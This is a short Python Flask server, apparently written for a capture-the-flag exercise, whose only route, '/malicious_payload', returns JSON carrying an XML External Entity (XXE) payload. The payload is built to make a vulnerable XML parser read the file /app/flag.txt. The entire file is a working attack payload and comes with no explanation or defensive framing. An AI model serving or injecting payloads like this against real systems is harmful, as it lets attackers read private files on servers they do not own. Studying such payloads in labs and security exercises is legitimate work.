from flask import Flask, jsonify, request
import json
import requests
import urllib.parse

app = Flask(__name__)

@app.route('/malicious_payload', methods=['GET'])
def malicious_payload():
    malicious_xml = """<!DOCTYPE root [
      <!ENTITY xxe SYSTEM "file:///app/flag.txt">
    ]>
    <root>
      <Comment>&xxe;</Comment>
    </root>"""

    payload = {
        "Comment": malicious_xml
    }

    return jsonify(payload)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8660)
